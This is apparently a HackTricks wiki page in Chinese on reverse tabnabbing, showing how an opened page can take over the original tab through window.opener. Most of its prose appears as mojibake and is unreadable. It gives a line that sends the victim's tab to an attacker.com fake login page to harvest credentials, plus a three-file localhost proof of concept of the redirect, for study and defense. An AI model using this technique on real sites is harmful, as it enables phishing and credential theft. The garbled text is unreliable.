{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}


# æè¿°

åœ¨**æ”»å‡»è€…**å¯ä»¥**æ§åˆ¶**å³å°†è¢«å—å®³è€…ç‚¹å‡»çš„å¸¦æœ‰å±æ€§**`target="_blank" rel="opener"`**çš„**`<a`**æ ‡ç­¾çš„**`href`**å‚æ•°çš„æƒ…å†µä¸‹ï¼Œ**æ”»å‡»è€…**å°†æ­¤**é“¾æ¥**æŒ‡å‘ä¸€ä¸ªä»–æ§åˆ¶çš„ç½‘é¡µï¼ˆä¸€ä¸ª**æ¶æ„** **ç½‘ç«™**ï¼‰ã€‚ç„¶åï¼Œä¸€æ—¦**å—å®³è€…ç‚¹å‡»**è¯¥é“¾æ¥å¹¶è®¿é—®æ”»å‡»è€…çš„ç½‘ç«™ï¼Œè¿™ä¸ª**æ¶æ„** **ç½‘ç«™**å°†èƒ½å¤Ÿé€šè¿‡javascriptå¯¹è±¡**`window.opener`**æ¥**æ§åˆ¶****åŸå§‹** **é¡µé¢**ã€‚\
å¦‚æœé¡µé¢æ²¡æœ‰**`rel="opener"`ä½†åŒ…å«`target="_blank"`ä¸”ä¹Ÿæ²¡æœ‰`rel="noopener"`**ï¼Œå®ƒä¹Ÿå¯èƒ½æ˜¯è„†å¼±çš„ã€‚

æ»¥ç”¨è¿™ç§è¡Œä¸ºçš„å¸¸è§„æ–¹æ³•æ˜¯é€šè¿‡`window.opener.location = https://attacker.com/victim.html`å°†**åŸå§‹ç½‘é¡µ**çš„ä½ç½®æ›´æ”¹ä¸ºä¸€ä¸ªç”±æ”»å‡»è€…æ§åˆ¶çš„**çœ‹èµ·æ¥åƒåŸå§‹ç½‘é¡µ**çš„ç½‘é¡µï¼Œä»¥ä¾¿å®ƒå¯ä»¥**æ¨¡ä»¿**åŸå§‹ç½‘ç«™çš„**ç™»å½•** **è¡¨å•**å¹¶å‘ç”¨æˆ·è¯·æ±‚å‡­æ®ã€‚

ç„¶è€Œï¼Œè¯·æ³¨æ„ï¼Œç”±äº**æ”»å‡»è€…ç°åœ¨å¯ä»¥æ§åˆ¶åŸå§‹ç½‘ç«™çš„çª—å£å¯¹è±¡**ï¼Œä»–å¯ä»¥ä»¥å…¶ä»–æ–¹å¼æ»¥ç”¨å®ƒæ¥æ‰§è¡Œ**æ›´éšè”½çš„æ”»å‡»**ï¼ˆä¹Ÿè®¸ä¿®æ”¹javascriptäº‹ä»¶ä»¥å°†ä¿¡æ¯å¤–æ³„åˆ°ä»–æ§åˆ¶çš„æœåŠ¡å™¨ï¼Ÿï¼‰

# æ¦‚è¿°

## æœ‰è¿”å›é“¾æ¥

å½“æœªä½¿ç”¨é¢„é˜²å±æ€§æ—¶ï¼Œçˆ¶é¡µé¢å’Œå­é¡µé¢ä¹‹é—´çš„é“¾æ¥ï¼š

![https://owasp.org/www-community/assets/images/TABNABBING_OVERVIEW_WITH_LINK.png](https://owasp.org/www-community/assets/images/TABNABBING\_OVERVIEW\_WITH\_LINK.png)

## æ— è¿”å›é“¾æ¥

å½“ä½¿ç”¨é¢„é˜²å±æ€§æ—¶ï¼Œçˆ¶é¡µé¢å’Œå­é¡µé¢ä¹‹é—´çš„é“¾æ¥ï¼š

![https://owasp.org/www-community/assets/images/TABNABBING_OVERVIEW_WITHOUT_LINK.png](https://owasp.org/www-community/assets/images/TABNABBING\_OVERVIEW\_WITHOUT\_LINK.png)

## ç¤ºä¾‹ <a href="#examples" id="examples"></a>

åœ¨ä¸€ä¸ªæ–‡ä»¶å¤¹ä¸­åˆ›å»ºä»¥ä¸‹é¡µé¢å¹¶è¿è¡Œä¸€ä¸ªwebæœåŠ¡å™¨ï¼Œä½¿ç”¨`python3 -m http.server`\
ç„¶åï¼Œ**è®¿é—®** `http://127.0.0.1:8000/`vulnerable.htmlï¼Œ**ç‚¹å‡»**é“¾æ¥å¹¶æ³¨æ„**åŸå§‹** **ç½‘ç«™** **URL** **çš„å˜åŒ–**ã€‚

{% code title="vulnerable.html" %}
```markup
<!DOCTYPE html>
<html>
<body>
<h1>Victim Site</h1>
<a href="http://127.0.0.1:8000/malicious.html" target="_blank" rel="opener">Controlled by the attacker</a>
</body>
</html>
```
{% endcode %}

{% code title="malicious.html" %}
```markup
<!DOCTYPE html>
<html>
<body>
<script>
window.opener.location = "http://127.0.0.1:8000/malicious_redir.html";
</script>
</body>
</html>
```
{% endcode %}

{% code title="malicious_redir.html" %}
```markup
<!DOCTYPE html>
<html>
<body>
<h1>New Malicious Site</h1>
</body>
</html>
```
{% endcode %}

## å¯è®¿é—®çš„å±æ€§ <a href="#accessible-properties" id="accessible-properties"></a>

åœ¨å‘ç”Ÿ**è·¨æº**è®¿é—®çš„æƒ…å†µä¸‹ï¼ˆè·¨ä¸åŒåŸŸçš„è®¿é—®ï¼‰ï¼Œæ¶æ„ç½‘ç«™å¯ä»¥è®¿é—®çš„**window** JavaScript ç±»å®ä¾‹çš„å±æ€§ä»…é™äºä»¥ä¸‹å†…å®¹ï¼š

- **`opener.closed`**ï¼šæ­¤å±æ€§ç”¨äºç¡®å®šçª—å£æ˜¯å¦å·²å…³é—­ï¼Œè¿”å›å¸ƒå°”å€¼ã€‚
- **`opener.frames`**ï¼šæ­¤å±æ€§æä¾›å¯¹å½“å‰çª—å£å†…æ‰€æœ‰ iframe å…ƒç´ çš„è®¿é—®ã€‚
- **`opener.length`**ï¼šæ­¤å±æ€§è¿”å›å½“å‰çª—å£ä¸­å­˜åœ¨çš„ iframe å…ƒç´ çš„æ•°é‡ã€‚
- **`opener.opener`**ï¼šå¯ä»¥é€šè¿‡æ­¤å±æ€§è·å–æ‰“å¼€å½“å‰çª—å£çš„çª—å£çš„å¼•ç”¨ã€‚
- **`opener.parent`**ï¼šæ­¤å±æ€§è¿”å›å½“å‰çª—å£çš„çˆ¶çª—å£ã€‚
- **`opener.self`**ï¼šæ­¤å±æ€§æä¾›å¯¹å½“å‰çª—å£æœ¬èº«çš„è®¿é—®ã€‚
- **`opener.top`**ï¼šæ­¤å±æ€§è¿”å›æœ€ä¸Šå±‚çš„æµè§ˆå™¨çª—å£ã€‚

ç„¶è€Œï¼Œåœ¨åŸŸåç›¸åŒçš„æƒ…å†µä¸‹ï¼Œæ¶æ„ç½‘ç«™å¯ä»¥è®¿é—®[**window**](https://developer.mozilla.org/en-US/docs/Web/API/Window) JavaScript å¯¹è±¡å¼•ç”¨æ‰€æš´éœ²çš„æ‰€æœ‰å±æ€§ã€‚

# é¢„é˜²

é¢„é˜²ä¿¡æ¯è®°å½•åœ¨[HTML5 Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTML5\_Security\_Cheat\_Sheet.html#tabnabbing)ä¸­ã€‚

## å‚è€ƒ

* [https://owasp.org/www-community/attacks/Reverse_Tabnabbing](https://owasp.org/www-community/attacks/Reverse_Tabnabbing)

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)æˆ–**å…³æ³¨**æˆ‘ä»¬åœ¨**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
